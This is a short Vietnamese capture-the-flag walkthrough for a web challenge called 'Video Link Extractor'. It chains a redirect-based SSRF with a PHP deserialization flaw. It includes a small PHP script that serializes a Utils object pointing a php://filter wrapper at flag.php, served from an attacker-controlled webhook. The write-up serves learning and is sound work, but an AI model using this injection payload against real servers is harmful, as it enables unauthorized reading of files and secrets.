# Video Link Extractor
+ Khi thực hiện extract localhost trang web thực hiện đoạn code:
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/96d5c64e-0dd3-4e96-a5d0-9af5e56a98dc)
+ Ta có thể lợi dụng tham số id để gọi đến `redirect ` và khiến nó truy cập vào trang web khác 
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/79b9f246-6418-4b22-b75b-17be148af615)
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/c5e03245-27eb-4c41-827c-0e5d7721603f)
+ Đã thực hiện get vào trang web của mình
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/f61766f4-0e69-4551-8981-a7055e0447ea)

Untrusted data sẽ là response ta trả về, khi đó nó được unserialize  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/d7d50fe9-c81c-4c3c-90e7-94338d6498a5)
Thêm vào đó object Utils khi __wakeup sẽ gọi $this->_file  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/fd5ebec4-0a91-4d57-be85-c6bd1333cbe8)
Script tạo serialize data:
```
<?php 
class Utils {
    public $_file = "php://filter/convert.base64-encode/resource=flag.php";
};
echo(serialize(new Utils()));
?>
```
Thay kết quả của script vào response của webhook   
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/3c8e2fb8-eea4-4e69-8fa1-cc04a4516059)

![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/241fcbd6-4164-4401-ad53-41fd4d5bbce0)

![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/7620d7ab-7190-40f5-adc3-e5b2120a418f)
